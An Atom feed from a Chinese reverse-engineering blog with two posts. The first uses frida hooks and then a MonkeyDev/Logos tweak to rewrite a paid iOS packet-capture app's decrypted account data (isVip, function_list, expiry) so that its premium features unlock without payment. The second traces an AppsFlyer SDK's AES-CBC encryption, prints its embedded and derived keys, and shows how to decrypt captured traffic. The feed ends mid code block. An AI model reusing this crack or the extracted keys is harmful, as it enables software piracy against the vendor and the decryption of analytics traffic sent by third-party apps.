<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>浮萍&#39;s Blog</title>
  
  <subtitle>学习#坚持</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://fuping.site/"/>
  <updated>2022-10-21T02:01:21.106Z</updated>
  <id>https://fuping.site/</id>
  
  <author>
    <name>浮萍</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>IOS逆向之某抓包APP</title>
    <link href="https://fuping.site/2022/10/21/IOS-Storm-Sniffer-Reverse/"/>
    <id>https://fuping.site/2022/10/21/IOS-Storm-Sniffer-Reverse/</id>
    <published>2022-10-21T00:10:18.000Z</published>
    <updated>2022-10-21T02:01:21.106Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>本文的测试目标是一个抓包的APP，可以使用hook或者代理的方式来获取高级功能，如解密HTTPS流量、重写HTTP请求以及重放等功能。由于个人账户（没有付费成为苹果开发者账号）的限制，注入打包后，无法正常使用抓包功能，因此算是一篇半成品，不过本文主要提供一些思路以及介绍一下数据之间的转换。</p><a id="more"></a><h2 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h2><p>运行后发现高级功能都需要付费才可以，抓包发现请求和返回都加密了。</p><p><img src="1665733985358.png" alt="img"></p><p>使用<code>frida-ios-dump</code>将ipa文件dump出来，之后用ida打开，发现该程序是用到了OC和swift。而且http请求采用了<code>Alamofire</code>，它是一个用 Swift 编写的 HTTP 网络库。</p><p>该程序较小，猜测加密函数中有<code>encrypt</code>关键字，于是在函数中搜索<code>encrypt</code>。</p><p>当然也可以根据http请求的一些内容搜索进而去定位加密的算法，在这里就不演示了。 </p><p><img src="1665734067271.png" alt="img"></p><p>可以看到有一些，可以使用<code>frida-trace</code>来追踪一下是调用了哪个方法。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-trace -U -f com.xxxx -m <span class="string">"*[* *encrypt*]"</span></span><br></pre></td></tr></table></figure><p>使用该命令可以看到如下调用：</p><p><img src="1666079236052.png" alt="img"></p><p>经过进一步验证发现是调用了类<code>XMXXTEA</code>相关的加密函数。一般这样同个类存在多个加（解）密，大多数都是简单的调用复杂的。从上图就可以看出来<code>encryptStringToBase64String:arg1 stringKey:arg2</code>调用了<code>encryptToBase64String:arg1 stringKey:arg2</code>。</p><p>所以我们看 <code>+[XMXXTEA encryptStringToBase64String:arg1 stringKey:arg2]</code>即可。</p><p>命令如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-trace -U -f com.xxxx -m <span class="string">"+[XMXXTEA encryptStringToBase64String:stringKey:]"</span></span><br></pre></td></tr></table></figure><p>执行后可以发现与抓包的内容一致。</p><p><img src="1666080138242.png" alt="img"></p><p>接下来我们看一下是否有数据的解密，同样搜<code>decrypt</code></p><p><img src="1666080460021.png" alt="img"></p><p> 根据上面的经验，猜测解密的是<code>+[XMXXTEA decryptBase64StringToString:stringKey:]</code>。结果进行追踪后发现并没调用，这里解密采用的是<code>+[XMXXTEA decryptBase64String:stringKey:]</code>。</p><p>可以看到解密数据。</p><p><img src="1666081155760.png" alt="img"></p><p>不过解密结果不是字符串类型，我们用<code>CyberChef</code>的hex解码后是json数据。</p><p><img src="1666081298004.png" alt="img"></p><p>返回的json中有几个关键的键值可以猜出其含义。例如<code>isVip</code>应该是判断是否为会员，<code>expire_on</code>表示到期时间，<code>auth_quantity</code>是授权数量，<code>function_list</code>应该是拥有的功能，比如非会员用户只有一个抓包功能，如果要拥有解密HTTPS、重写等功能，则<code>function_list</code>应该是[1,2,3]。当然这些只是猜测。</p><p>尝试修改一下<code>isVip</code>的值为1，看是否有反应。首先看一下<code>+[XMXXTEA decryptBase64String:stringKey:]</code>解密返回值的类型是什么。</p><p>主要代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">onLeave(log, retval, state) &#123;</span><br><span class="line">    <span class="keyword">var</span> ret = ObjC.Object(retval);</span><br><span class="line">    log(<span class="string">`ret type is --&gt;`</span>+ret.$className);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>执行后返回的结果：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ret type is --&gt;NSConcreteData</span><br></pre></td></tr></table></figure><p>返回值是<code>NSConcreteData</code>类型的，可以看作为是<code>NSData</code>。修改返回值有两种方法，第一种是将<code>NSData</code>转化为<code>NSString</code>，然后利用字符串替换来修改，修改完毕后转化<code>NSData</code>并替换；第二种是将<code>NSData</code>转化为可变数组<code>NSMutableDictionary</code>，然后修改键的值，最后再转化<code>NSData</code>并替换。</p><p>下面分别看一下两种方法的OC代码，以及翻译成frida的js实现的代码。</p><h3 id="方法一：使用NSString替换"><a href="#方法一：使用NSString替换" class="headerlink" title="方法一：使用NSString替换"></a>方法一：使用NSString替换</h3><p>对应的主要OC代码如下：</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">NSString</span> *str = <span class="string">@"&#123;\"uid\": \"xxxxxxx\", \"userID\": \"xxxxx\", \"isVip\": 0, \"member_type\": 0, \"member_title\": \"\\u57fa\\u7840\\u7248\", \"expire_on\": \"\\u6682\\u672a\\u5f00\\u901aVIP\", \"auth_quantity\": 0, \"auth_mail\": null, \"is_primary\": 0, \"trail_status\": 0, \"function_list\": [1], \"timestamp\": 1666080682, \"ts\": 0&#125;"</span>;</span><br><span class="line"><span class="built_in">NSData</span> * data = [str dataUsingEncoding:<span class="built_in">NSUTF8StringEncoding</span>];<span class="comment">//NSString转换为NSData</span></span><br><span class="line"><span class="built_in">NSString</span> *oldString = [[<span class="built_in">NSString</span> alloc]initWithData:data encoding:<span class="built_in">NSUTF8StringEncoding</span>];<span class="comment">//NSData转换为NSString</span></span><br><span class="line"><span class="built_in">NSString</span> * newString = [str stringByReplacingOccurrencesOfString:<span class="string">@"\"isVip\": 0"</span> withString:<span class="string">@"\"isVip\": 1"</span>];<span class="comment">//替换字符串</span></span><br><span class="line"><span class="built_in">NSLog</span>(<span class="string">@"oldString is:\n%@"</span>,oldString);</span><br><span class="line"><span class="built_in">NSLog</span>(<span class="string">@"newString is:\n%@"</span>,newString);</span><br></pre></td></tr></table></figure><p>这里为了使用NSData数据，采用的是NSString转换而来的，当然也可以采用byte来生成。主要代码：</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Byte byte[] = &#123;<span class="number">0x7B</span>,..., <span class="number">0x7D</span>&#125;;</span><br><span class="line"><span class="built_in">NSData</span> *byteData = [[<span class="built_in">NSData</span> alloc] initWithBytes:byte length:<span class="keyword">sizeof</span>(byte)/<span class="keyword">sizeof</span>(Byte)];</span><br></pre></td></tr></table></figure><p>OC代码执行的结果如下：</p><p><img src="1666143640301.png" alt="img"></p><p>可以成功替换，翻译成frida的js实现如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">onLeave(log, retval, state) &#123;</span><br><span class="line">  <span class="keyword">var</span> ret = ObjC.Object(retval);</span><br><span class="line">  <span class="keyword">var</span> oldNSStr = ObjC.classes.NSString.alloc().initWithData_encoding_(ret, <span class="number">4</span>);<span class="comment">//NSData转换为NSString</span></span><br><span class="line">  log(<span class="string">`oldNSStr--&gt;`</span>+ oldNSStr);</span><br><span class="line">  <span class="keyword">var</span> newNSStr = oldNSStr.stringByReplacingOccurrencesOfString_withString_(<span class="string">'"isVip": 0'</span>,<span class="string">'"isVip": 1'</span>);<span class="comment">//替换字符串</span></span><br><span class="line">  log(<span class="string">`newNSStr--&gt;`</span>+ newNSStr);</span><br><span class="line">  retval.replace(newNSStr.dataUsingEncoding_(<span class="number">4</span>));<span class="comment">//NSString转换为NSData，并替换返回值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果：</p><p><img src="1666100239409.png" alt="img"></p><p>同时查看我的账号界面可以看到PRO标志。</p><p><img src="1666101158786.png" alt="img"></p><p>但是点击解密HTTPS流量、重写等功能还是跳转到会员开通界面，这是因为这些功能是从<code>function_list</code>中获取的，所以想要解锁功能还需修改这里。主要代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> newNSStr = oldNSStr.stringByReplacingOccurrencesOfString_withString_(<span class="string">'"isVip": 0'</span>,<span class="string">'"isVip": 1'</span>).stringByReplacingOccurrencesOfString_withString_(<span class="string">'"is_vip": 0'</span>,<span class="string">'"is_vip": 1'</span>).stringByReplacingOccurrencesOfString_withString_(<span class="string">'"member_type": 0'</span>,<span class="string">'"member_type": 1'</span>).stringByReplacingOccurrencesOfString_withString_(<span class="string">'"auth_quantity": 0'</span>,<span class="string">'"auth_quantity": 3'</span>).stringByReplacingOccurrencesOfString_withString_(<span class="string">'"function_list": [1]'</span>,<span class="string">'"function_list": [1,2,3,4,5]'</span>).stringByReplacingOccurrencesOfString_withString_(<span class="string">'\\u6682\\u672a\\u5f00\\u901aVIP'</span>,<span class="string">'2099-09-09 14:22'</span>);</span><br><span class="line">log(<span class="string">`newNSStr--&gt;`</span>+ newNSStr);</span><br></pre></td></tr></table></figure><p>再次执行</p><p><img src="1666100947797.png" alt="img"></p><p>看到用户界面也成功变化了</p><p><img src="1666101229379.png" alt="img"></p><p>高级功能也可以使用</p><p><img src="1666101255791.png" alt="img"></p><p>例如重写功能，将请求的某度转到qq上</p><p><img src="1666101314198.png" alt="img"></p><p>功能都是可以正常使用的。</p><h3 id="方法二：使用NSMutableDictionary修改"><a href="#方法二：使用NSMutableDictionary修改" class="headerlink" title="方法二：使用NSMutableDictionary修改"></a>方法二：使用NSMutableDictionary修改</h3><p>对应的主要OC代码如下：</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">NSData</span> * data = [str dataUsingEncoding:<span class="built_in">NSUTF8StringEncoding</span>];</span><br><span class="line"><span class="built_in">NSMutableDictionary</span> * result = [<span class="built_in">NSJSONSerialization</span> JSONObjectWithData:data options:<span class="built_in">NSJSONReadingMutableContainers</span> error:<span class="literal">nil</span>];<span class="comment">//NSData转NSMutableDictionary</span></span><br><span class="line">[result setValue:[<span class="built_in">NSNumber</span> numberWithInt:<span class="number">1</span>] forKey:<span class="string">@"isVip"</span>];<span class="comment">//设置isVip为1</span></span><br><span class="line">[result setValue:<span class="string">@"[1,2,3,4,5]"</span> forKey:<span class="string">@"function_list"</span>];<span class="comment">//设置function_list</span></span><br><span class="line">[result setValue:<span class="string">@"2099-09-09 14:22"</span> forKey:<span class="string">@"expire_on"</span>];<span class="comment">//设置expire_on</span></span><br><span class="line"><span class="built_in">NSLog</span>(<span class="string">@"oldString is:%@"</span>,str);</span><br><span class="line"><span class="built_in">NSLog</span>(<span class="string">@"After Change is:%@"</span>,result);</span><br></pre></td></tr></table></figure><p>查看执行的结果</p><p><img src="1666141054823.png" alt="img"></p><p>这里翻译成frida的js实现时，有一个问题，生成<code>NSMutableDictionary</code>时，由于需要传入<code>nil</code>，而frida中无法生成，导致这种方法不能使用。根据别人提出的方法<code>var nil=ObjC.Object(ptr(&quot;0x0&quot;));</code>，测试代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> data = ObjC.classes.NSString.stringWithString_(<span class="string">'&#123;"aa":11,"bb":2&#125;'</span>) ;</span><br><span class="line"><span class="keyword">var</span> NSJSONSerialization = ObjC.classes.NSJSONSerialization;</span><br><span class="line"><span class="keyword">var</span> nil=ObjC.Object(ptr(<span class="string">"0x0"</span>));</span><br><span class="line">NSJSONSerialization.JSONObjectWithData_options_error_(data,<span class="number">1</span>,nil);</span><br></pre></td></tr></table></figure><p>运行后直接崩溃，导致无法使用，因此在frida下，暂时放弃第二种方法。</p><p>分析的话到这里就结束了，但借助frida来获取高级版，不方便使用，而且无法在非越狱手机上使用，如果想在非越狱手机上使用的话，就需要使用一些插件来运行在非越狱手机上。</p><h2 id="0x02-编写非越狱插件"><a href="#0x02-编写非越狱插件" class="headerlink" title="0x02 编写非越狱插件"></a>0x02 编写非越狱插件</h2><p>编写插件采用了非越狱插件开发集成神器<a href="https://github.com/AloneMonkey/MonkeyDev" target="_blank" rel="noopener">MonkeyDev</a>，集成了theos+Tweaks+Reveal.framework +Cycript +class-dump+CaptainHook。</p><p>安装和卸载可以参考<a href="https://github.com/AloneMonkey/MonkeyDev/wiki/安装" target="_blank" rel="noopener">https://github.com/AloneMonkey/MonkeyDev/wiki/%E5%AE%89%E8%A3%85</a></p><p>安装完成后新建MonkeyApp，<code>File-&gt;New-&gt;Project-&gt;MonkeyApp</code>。</p><p>项目建立后将砸壳后的APP拖入到<code>TargetApp</code>目录下。</p><p>这里使用Logos进行Hook代码，HOOK 某个类里面的某个对象方法语法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%hook 类名</span><br><span class="line">- (返回值)方法名:(id)arg1 ....</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line">%end</span><br></pre></td></tr></table></figure><p>根据上面的分析，这里我们需要对<code>XMXXTEA</code> 类的方法<code>decryptBase64String:stringKey:</code>进行HOOK，修改返回值，主要代码如下：</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">%hook XMXXTEA</span><br><span class="line">+ (<span class="keyword">id</span>) decryptBase64String:(<span class="built_in">NSString</span>*) stringData stringKey:(<span class="built_in">NSString</span>*) key&#123;</span><br><span class="line"> <span class="built_in">NSLog</span>(<span class="string">@"Before : %@"</span>, %orig);</span><br><span class="line"><span class="built_in">NSData</span> *data = %orig;<span class="comment">//NSData</span></span><br><span class="line">    <span class="built_in">NSMutableDictionary</span> *result = [<span class="built_in">NSJSONSerialization</span> JSONObjectWithData:data options:<span class="built_in">NSJSONReadingMutableContainers</span> error:<span class="literal">nil</span>];<span class="comment">//NSData转换NSMutableDictionary</span></span><br><span class="line">    </span><br><span class="line">    [result setValue:[<span class="built_in">NSNumber</span> numberWithInt:<span class="number">1</span>] forKey:<span class="string">@"isVip"</span>];</span><br><span class="line">    [result setValue:[<span class="built_in">NSNumber</span> numberWithInt:<span class="number">1</span>] forKey:<span class="string">@"member_type"</span>];</span><br><span class="line">    [result setValue:[<span class="built_in">NSNumber</span> numberWithInt:<span class="number">3</span>] forKey:<span class="string">@"auth_quantity"</span>];</span><br><span class="line">    [result setValue:<span class="string">@"[1,2,3,4,5]"</span> forKey:<span class="string">@"function_list"</span>];</span><br><span class="line">    [result setValue:<span class="string">@"2099-09-03 14:22"</span> forKey:<span class="string">@"expire_on"</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">NSData</span> *data_result= [<span class="built_in">NSJSONSerialization</span> dataWithJSONObject:result options:<span class="built_in">NSJSONWritingPrettyPrinted</span> error:<span class="literal">nil</span>];</span><br><span class="line">    <span class="built_in">NSLog</span>(<span class="string">@"After : %@"</span>, data_result);</span><br><span class="line">    <span class="keyword">return</span> data_result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">%end</span><br></pre></td></tr></table></figure><p>其实和上面第二种方法中的OC代码一样，连接非越狱手机后使用⌘+R运行该项目。</p><p>首次在新设备上运行，需要设置-通用-描述文件与设备管理中信任证书，ios16以上需要开启开发者模式，隐私安全-开发者模式，而且需要重启。</p><p>运行后，高级版功能都可以打开，但是无法开启抓包功能。</p><p>因为开启抓包需要开通网络访问权限以及VPN的相关权限，由于账号没有付费成为苹果开发者账号，因此这些权限无法使用。</p><p>苹果开发者账号可用的权限：</p><p><img src="1666147369001.png" alt="img"></p><p>非开发者账号可用的权限：</p><p><img src="1666147437744.png" alt="img"></p><p>这里即使把权限添加上，也会编译不通过的。</p><p><img src="1666147780150.png" alt="img"></p><p>这里就需要注册成开发者账号才可以继续进行，因此就放弃了。</p><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>本文通过一款抓包APP借助于frida来获取高级权限，另外介绍了一下OC下NSData、NSString、NSMutableDictionary之间的数据转换，以及翻译成frida中js代码的实现。</p><p>其实也可以利用代理的方式，来修改返回包的内容，从而解锁会员功能。这里简单提供一下思路，可以借助第三方抓包软件（有重写功能的，手机上的也可以，如<code>HTTP Catcher</code>）。需要注意几点：一是每个设备加密key不一样，二是需要注意请求头中的t（时间戳），这个值与手机时间相差不能太多（可以修改手机时间）。大致流程就是首先获取加密算法的key，将请求头中的t、解密结果中的timestamp以及手机时间不要差太多，将修改后的数据加密后进行替换即可。或者自己搭建一个服务，将数据转发到自己服务上，解密修改后重新加密返回即可。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;本文的测试目标是一个抓包的APP，可以使用hook或者代理的方式来获取高级功能，如解密HTTPS流量、重写HTTP请求以及重放等功能。由于个人账户（没有付费成为苹果开发者账号）的限制，注入打包后，无法正常使用抓包功能，因此算是一篇半成品，不过本文主要提供一些思路以及介绍一下数据之间的转换。&lt;/p&gt;
    
    </summary>
    
    
      <category term="IOS逆向" scheme="https://fuping.site/categories/IOS%E9%80%86%E5%90%91/"/>
    
    
      <category term="Sniffer" scheme="https://fuping.site/tags/Sniffer/"/>
    
      <category term="frida" scheme="https://fuping.site/tags/frida/"/>
    
      <category term="抓包软件" scheme="https://fuping.site/tags/%E6%8A%93%E5%8C%85%E8%BD%AF%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>IOS逆向之appsflyer平台解密</title>
    <link href="https://fuping.site/2022/10/13/IOS-appsflyer-decrypt/"/>
    <id>https://fuping.site/2022/10/13/IOS-appsflyer-decrypt/</id>
    <published>2022-10-13T00:10:18.000Z</published>
    <updated>2022-10-21T01:53:57.454Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>前段时间有这样一个需求，需要抓一下IOS端下appsflyer这个平台的数据，于是就帮忙看了一下。这里其实和APP没多大关系，需要接入appsflyer这个平台的APP就可以，然后将抓包获取的加密数据进行解密。</p><a id="more"></a><h2 id="0x01-准备"><a href="#0x01-准备" class="headerlink" title="0x01 准备"></a>0x01 准备</h2><p>给我的并不是一个ipa文件，而是一个压缩包文件。</p><p><img src="1665475953282.png" alt="img"></p><p>Payload.zip其实就是ipa文件进行解压后再压缩而来的，但是修改文件名直接安装是不行的，需要重新签名。</p><p>这里将文件重命名为1.ipa，不进行签名，然后使用命令<code>ideviceinstaller -i 1.ipa</code>进行安装，结果安装失败。</p><p><img src="1665476387171.png" alt="image.png"></p><blockquote><p>可以使用命令安装，也可以借助其他工具安装，如Xcode、爱思助手等。</p></blockquote><p>签名的话也有多种方法，我这里使用<code>IOS App Signer</code>进行签名。<br><img src="1665453441068.png" alt=""><br>签名后重新安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ideviceinstaller -i 1-sign.ipa</span><br></pre></td></tr></table></figure><p><img src="1665476872147.png" alt="image.png"><br>签名后安装成功，对比源文件与签名后文件的签名。<br><img src="1665477694718.png" alt="image.png"><br>接下来就是进行抓包分析了。</p><h2 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h2><p>运行app并抓包，会发现有很多请求，但每次打开APP与appsflyer有关的请求一般有三个，可以直接过滤出来。<br><img src="1664700263947.png" alt=""><br>可以看到请求的内容是乱码，应该是采用了某种加密。接下来使用ida对文件进行分析。<br>一般都是进行关键字的搜索，然后慢慢定位找到加密相关的函数，例如这里搜索的关键字是<code>iosevent</code>。<br><img src="1665478042545.png" alt="image.png"><br>对比一下请求的URL，可能是第一个。<br>一直查找引用，直到发现<code>-[AppsFlyerLib __validateAndLogInAppPurchase:price:currency:transactionId:additionalParameters:success:failure:]</code>进行了调用。<br><img src="1665479059395.png" alt="image.png"></p><p>使用<code>frida-trace</code>进行追踪<br><code>frida-trace -U -f cn.fuping.hhrx -m &quot;-[AppsFlyerLib __validateAndLogInAppPurchase:price:currency:transactionId:additionalParameters:success:failure:]&quot;</code>。<br><img src="1665479210801.png" alt="image.png"><br>这里仍有三个appsflyer相关的请求，但是发现并没有对该方法进行调用，因此可能是找错了。</p><p>通过查看请求，可以看到<code>Content-Type</code>是<code>application/octet-stream</code>，所以也可去搜索<code>application/octet-stream</code>。<br><img src="1665479524193.png" alt="image.png"><br>搜索<code>application/octet-stream</code>。</p><p><img src="1665479555145.png" alt="image.png"><br>一直查找引用，最终定位在<code>-[AppsFlyerHTTPClient sendEvent:completionHandler:]</code>方法中。</p><p><img src="1665543559382.png" alt="image.png"><br>在其中也可以看到调用了与加密相关的内容<code>-[AFSDKEvent encryptWithData:]</code>。<br>使用<code>frida-trace</code>进行追踪<br>关键代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  onEnter(log, args, state) &#123;</span><br><span class="line">    <span class="keyword">var</span> arg2ObjC = ObjC.Object(args[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">var</span> arg2 = Memory.readUtf8String(arg2ObjC.bytes(), arg2ObjC.length());</span><br><span class="line">    log(<span class="string">`-[AFSDKEvent encryptWithData:<span class="subst">$&#123;arg2&#125;</span>]`</span>);</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  onLeave(log, retval, state) &#123;</span><br><span class="line">    log(<span class="string">`-[AFSDKEvent encryptWithData:-&gt;result-&gt;<span class="subst">$&#123;ObjC.<span class="built_in">Object</span>(retval)&#125;</span>]`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以成功获取加密前的数据<br><img src="1665562522159.png" alt="image.png"><br>加密后的结果也是一致的。接下来就是看加密是如何实现的，另外能否进行解密。<br><img src="1665562646545.png" alt="image.png"><br>进入到<code>-[AFSDKEvent encryptWithData:]</code>方法，看是如何进行加密的。<br><img src="1665562914366.png" alt="image.png"><br>通过分析发现其调用了<code>-[AFSDKEvent key]</code>获取key，这里key是固定的，为<code>X3sgfYhYXWhDoD8DhW2aaJ</code>。然后调用<code>+[AppsFlyerAES128Crypto encrypt:withObject:]</code>进行加密。继续跟进加密的方法。<br><img src="1665563333248.png" alt="image.png"></p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CCCrypt(<span class="number">0</span>LL, <span class="number">0</span>LL, <span class="number">1</span>LL, v19, v20, v22, v24, v25, v27, v28, &amp;v35)</span><br></pre></td></tr></table></figure><p>这里看到了<code>CCCrypt</code>函数的调用，可以先了解一下该函数，然后分析加密流程。<br>使用<code>CCCrypt</code>进行加密时，需要引入<code>CommonCrypto/CommonCryptor.h</code>框架。<br>其中<code>CCCrypt</code>函数定义：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">CCCryptorStatus CCCrypt(</span><br><span class="line">    CCOperation op,         <span class="comment">/* kCCEncrypt, etc. */</span></span><br><span class="line">    CCAlgorithm alg,        <span class="comment">/* kCCAlgorithmAES128, etc. */</span></span><br><span class="line">    CCOptions options,      <span class="comment">/* kCCOptionPKCS7Padding, etc. */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">void</span> *key,</span><br><span class="line">    size_t keyLength,</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">void</span> *iv,         <span class="comment">/* optional initialization vector */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">void</span> *dataIn,     <span class="comment">/* optional per op and alg */</span></span><br><span class="line">    size_t dataInLength,</span><br><span class="line">    <span class="keyword">void</span> *dataOut,          <span class="comment">/* data RETURNED here */</span></span><br><span class="line">    size_t dataOutAvailable,</span><br><span class="line">    size_t *dataOutMoved)</span><br></pre></td></tr></table></figure><p>一共有11个参数，参数简要说明如下：</p><table><thead><tr><th>参数</th><th>说明</th><th>备注</th></tr></thead><tbody><tr><td>CCOperation op</td><td>加密(kCCEncrypt=0)</td><td></td></tr><tr><td>解密(kCCDecrypt=1)</td><td>这里是加密</td><td></td></tr><tr><td>CCAlgorithm alg</td><td>加解密算法标准</td><td></td></tr><tr><td>kCCAlgorithmAES128=0,</td><td></td><td></td></tr><tr><td>kCCAlgorithmAES=0</td><td>这里为kCCAlgorithmAES128或者kCCAlgorithmAES加密</td><td></td></tr><tr><td>CCOptions options</td><td>加密方式的选项</td><td></td></tr><tr><td>kCCOptionPKCS7Padding表示CBC</td><td></td><td></td></tr><tr><td>kCCOptionECBMode表示ECB</td><td></td><td></td></tr><tr><td>kCCOptionPKCS7Padding&#124;kCCOptionECBMode表示ECB且PKCS7Padding填充</td><td>这里为CBC加密，且用PKCS7Padding进行填充</td><td></td></tr><tr><td>const void *key</td><td>加密密钥</td><td>固定值</td></tr><tr><td>size_t keyLength</td><td>密钥长度</td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td>const void *iv</td><td>iv 初始化向量，ECB 不需要指定</td><td>随机值</td></tr><tr><td>const void *dataIn</td><td>加密的数据</td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td>size_t dataInLength</td><td>加密的数据长度</td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td>void *dataOut</td><td>缓冲区（地址），存放密文的</td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td>size_t dataOutAvailable</td><td>缓冲区的大小</td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td>size_t *dataOutMoved</td><td>加密结果大小</td><td></td></tr><tr><td></td><td></td><td></td></tr></tbody></table><p>然后转过头来分析加密的流程。首先调用了<code>+[AppsFlyerAES128Crypto randomDataOfLength:]</code>生成了一个16byte的随机字符作为iv。<br>接着调用<code>+[AppsFlyerAES128Crypto AESKeyForPassword:salt:]</code>对key进行解密，解密后的的结果作为加密的key值，为<code>84adf6ec41acb6cbeb349d0a7078f0d2</code>。<br>最后调用CCCrypt进行加密，加密方法是AES-CBC。<br><img src="1665564158204.png" alt="image.png"><br>加密完成后将IV和8位00与加密数据进行拼接。所以可以直接根据请求的数据进行解密。<br><img src="1665583353853.png" alt="image.png"><br>例如上面的请求包共分为三部分，第一部分为加密后的内容，第二部分为IV，长度为16，这里是<code>b820980ed08844945179a96721bbbcd3</code>，第三部分为0，长度为8。<br>然后进行解密：<br><img src="1665583487412.png" alt="image.png"><br>成功解密数据，到这里任务就完成了。<br>其实在搜索的时候也可以搜索其他关键字，例如<code>buildnumber</code>。<br><img src="1665479366366.png" alt="image.png"><br>被圈中的两个字符串与URL进行对比，相似度很高。可以进一步去分析查找引用进行分析。<br>另外这里的加密用到了<code>CCCrypt</code>函数，所以也可以直接对其进行追踪，例如</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-trace -U -f xxxx -i CCCrypt</span><br></pre></td></tr></table></figure><p>然后修改<code>libcommonCrypto.dylib</code>下的<code>CCCrypt.js</code>文件，主要代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 